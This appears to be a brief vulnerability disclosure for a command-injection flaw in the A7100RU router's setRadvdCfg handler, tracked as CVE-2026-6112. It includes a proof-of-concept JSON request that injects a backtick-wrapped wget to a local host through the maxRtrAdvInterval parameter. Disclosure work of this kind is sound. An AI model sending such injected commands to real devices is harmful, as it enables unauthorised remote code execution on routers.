# A7100RU Vulnerability（CVE-2026-6112）
...
In sub_421ED4 function, it reads in a user-provided parameter `maxRtrAdvInterval` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `maxRtrAdvInterval` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setRadvdCfg","maxRtrAdvInterval":"`wget 192.168.6.1:7777/testpoc`"
}
```
